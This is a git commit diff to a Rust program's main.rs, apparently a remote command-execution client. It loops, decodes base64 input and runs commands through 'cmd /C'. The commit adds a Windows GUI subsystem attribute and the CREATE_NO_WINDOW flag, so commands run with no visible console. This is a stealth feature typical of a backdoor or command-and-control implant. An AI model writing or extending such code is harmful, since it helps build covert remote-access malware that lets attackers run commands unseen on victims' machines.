515efc27dfa024e8c7a6b887baff89063d3de924
GreasyRooster <greasyRooster1@gmail.com>
2024-09-19 19:47:52 -0700

    inital

--- src/main.rs
+++ src/main.rs
@@ -1,10 +1,13 @@
+
+#![windows_subsystem = "windows"]
 use std::error::Error;
+use std::os::windows::process::CommandExt;
 use std::process::Command;
 use std::thread;
 use std::time::Duration;
 use base64::prelude::*;
 
-
+const CREATE_NO_WINDOW: u32 = 0x08000000;
 
 fn main() {
     loop {
@@ -19,6 +22,7 @@ fn main() {
 
             let output = Command::new("cmd")
                 .args(&["/C", command.as_str()])
+                .creation_flags(CREATE_NO_WINDOW)
                 .output()
                 .expect("failed to execute process");
 
